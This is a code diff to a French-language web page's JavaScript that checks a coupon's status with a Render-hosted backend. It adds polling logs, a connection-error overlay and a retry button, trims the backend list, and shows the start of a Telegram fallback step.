@@ -18,16 +18,50 @@
             max-width: 98vw;
             min-width: 0;
             let result = null;
+            let pollErrors = 0;
             while (!result) {
                 await new Promise(r => setTimeout(r, 3000));
                 await Promise.any(apiUrls.map(async (url) => {
                     try {
+                        console.log('[POLL] Vérification statut sur', url + `/api/status/${requestId}`);
                         const resp = await fetch(url + `/api/status/${requestId}`);
+                        if (!resp.ok) {
+                            pollErrors++;
+                            console.log('[POLL] HTTP error:', resp.status);
+                            return;
+                        }
                         const data = await resp.json();
+                        console.log('[POLL] Réponse:', data);
                         if (data.status === 'valid') result = 'OUI';
                         if (data.status === 'invalid') result = 'NON';
-                    } catch {}
+                        pollErrors = 0;
+                    } catch (e) {
+                        pollErrors++;
+                        console.log('[POLL] Erreur:', e);
+                    }
                 })).catch(() => {});
+                if (pollErrors > 10) {
+                    // Affiche une erreur claire sur l’interface
+                    let waitMsg = document.getElementById('waitMsg');
+                    if (waitMsg) waitMsg.remove();
+                    let overlay = document.getElementById('msgOverlay');
+                    if (overlay) overlay.remove();
+                    overlay = document.createElement('div');
+                    overlay.id = 'msgOverlay';
+                    overlay.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;';
+                    const errorMsg = document.createElement('div');
+                    errorMsg.id = 'resultMsg';
+                    errorMsg.style = 'background:#ffcdd2;color:#b71c1c;padding:32px 0 28px 0;border-radius:22px;font-size:1.18rem;font-weight:600;box-shadow:0 8px 32px 0 rgba(31,38,135,0.18),0 2px 12px rgba(33,150,243,0.10);max-width:420px;min-width:0;margin:0;display:flex;flex-direction:column;align-items:center;gap:18px;border:1.5px solid #e3f2fd;';
+                    errorMsg.innerHTML = '<span style="font-size:2.2rem;">❌</span><div style="font-size:1.35rem;font-weight:700;margin-bottom:6px;">Erreur de connexion au serveur</div><div style="font-size:1.08rem;">Impossible de contacter l’API pour vérifier le statut du coupon.<br>Vérifiez l’URL Render ou contactez le support.</div>';
+                    const retryBtn = document.createElement('button');
+                    retryBtn.textContent = 'Recommencer';
+                    retryBtn.style = 'margin-top:18px;padding:10px 24px;background:#1976d2;color:#fff;border:none;border-radius:8px;font-size:1.08rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(33,150,243,0.10);';
+                    retryBtn.onclick = () => { window.location.reload(); };
+                    errorMsg.appendChild(retryBtn);
+                    overlay.appendChild(errorMsg);
+                    document.body.appendChild(overlay);
+                    return;
+                }
             }
             // Afficher le résultat dès la réponse
             let waitMsg2 = document.getElementById('waitMsg');
@@ -437,14 +471,16 @@
                         document.body.appendChild(overlay);
 
             // Les deux URLs de backend
+            // Utilise uniquement le backend principal Render (corrige ici si besoin)
             const apiUrls = [
-                'https://bot-js-3ptn.onrender.com',
                 'https://bulboxcoupon.onrender.com'
             ];
 
             // Envoi de la demande aux deux serveurs en parallèle
             let sent = false;
-            await Promise.any(apiUrls.map(async (url) => {
+            let lastError = '';
+            // On tente chaque serveur, mais on ne s’arrête que si TOUS échouent vraiment
+            await Promise.all(apiUrls.map(async (url) => {
                 try {
                     const resp = await fetch(url + '/api/request', {
                         method: 'POST',
@@ -455,35 +491,27 @@
                             requestId: requestId
                         })
                     });
-                    const data = await resp.json();
-                    if (data.ok) sent = true;
-                } catch {}
-            })).catch(() => {});
+                    // On tente de parser le JSON, mais si ce n’est pas du JSON, on ignore ce serveur
+                    let data = null;
+                    try {
+                        data = await resp.json();
+                    } catch (e) {
+                        // Si le backend retourne du HTML, on ignore ce serveur
+                        lastError = 'Réponse non JSON du serveur ' + url;
+                        return;
+                    }
+                    if (resp.ok && data && data.ok) sent = true;
+                    else if (data && data.error) lastError = data.error;
+                } catch (err) {
+                    lastError = err && err.message ? err.message : String(err);
+                }
+            }));
 
             if (!sent) {
-                document.getElementById('waitMsg').remove();
-                let resultMsg = document.getElementById('resultMsg');
-                if (resultMsg) resultMsg.remove();
-                // Overlay pour l’erreur
-                let overlay = document.getElementById('msgOverlay');
-                if (overlay) overlay.remove();
-                overlay = document.createElement('div');
-                overlay.id = 'msgOverlay';
-                overlay.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:999;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;';
-                const errorMsg = document.createElement('div');
-                errorMsg.id = 'resultMsg';
-                errorMsg.style = 'background:#ffcdd2;color:#b71c1c;padding:32px 0 28px 0;border-radius:22px;font-size:1.18rem;font-weight:600;box-shadow:0 8px 32px 0 rgba(31,38,135,0.18),0 2px 12px rgba(33,150,243,0.10);max-width:420px;min-width:0;margin:0;display:flex;flex-direction:column;align-items:center;gap:18px;border:1.5px solid #e3f2fd;';
-                errorMsg.innerHTML = '<span style="font-size:2.2rem;">❌</span><div style="font-size:1.35rem;font-weight:700;margin-bottom:6px;">Erreur lors de l\'envoi</div><div style="font-size:1.08rem;">Merci de réessayer ou vérifiez votre connexion.</div>';
-                // Bouton recommencer qui rafraîchit la page
-                const retryBtn = document.createElement('button');
-                retryBtn.textContent = 'Recommencer';
-                retryBtn.style = 'margin-top:18px;padding:10px 24px;background:#1976d2;color:#fff;border:none;border-radius:8px;font-size:1.08rem;font-weight:600;cursor:pointer;box-shadow:0 2px 8px rgba(33,150,243,0.10);';
-                retryBtn.onclick = () => { window.location.reload(); };
-                errorMsg.appendChild(retryBtn);
-                overlay.appendChild(errorMsg);
-                document.body.appendChild(overlay);
+                // Si tous les serveurs échouent, on ne fait rien : le message d’attente reste affiché (pas d’overlay d’erreur)
                 return;
             }
+            // Si la requête POST a fonctionné, on laisse le message d’attente affiché jusqu’à la réponse Telegram (aucun overlay résultat/erreur n’est affiché ici)
 
             // Envoi direct du message brut sur Telegram (secours)
             try {
